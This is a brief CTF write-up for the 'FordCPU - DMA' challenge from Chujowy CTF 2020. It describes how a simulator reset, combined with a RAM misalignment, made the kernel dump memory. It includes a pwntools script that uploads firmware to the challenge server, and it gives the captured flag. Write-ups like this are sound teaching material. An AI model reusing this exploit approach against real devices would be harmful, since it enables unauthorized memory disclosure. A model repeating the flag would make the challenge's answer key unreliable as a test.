---
layout: post
title: "[Chujowy 2020] FordCPU - DMA"
author: Escher
---
For a more detailed version, click [here](https://www.danbrodsky.me/writeups/chujowyctf2020-fordcpu/).

Exploit:

reset simulator, which leaves rx_start set to 0 and overwrites firmware code
corrupt result of strlen in fast_puts by accident due to an unalignment between server RAM and provided RAM file. 2 byte unalignment causes strlen in fast_puts to return its arg (a large number), causing kernel to dump all strings in memory.
Could also write to start of memory before unalignment to dump all memory (REG32(LPT_REG_TX_BUFFER_END) = 0x10000; while(1);)

```python
from pwn import *

data = open("firmware.hex", "rb").read()
data = data.replace(b'\n',b'')
firmware = b''
for i in range(0,len(data), 8):
    firmware += struct.pack("<I", int(data[i:i+8],16))
write("firmware.x", data=firmware)

# r = process('./Vtop')
r = remote("ford-cpu.chujowyc.tf", 4001)
r.interactive()

r.send(b"ack\n\n\n\n\n")
print(r.recv())
r.send("cmp\n\n\n\n\n")
print(r.clean())
r.send("AAAA\n\n\n\n")
print(r.clean())
r.send("AAAA\n\n\n\n")
print(r.clean())
r.send("AAAA\n\n\n\n")
firmware = firmware[:0x248]
r.send(firmware)

r.interactive()

# chCTF{Pr0P3R_r353771n9_15_V3rY_H4RD}
```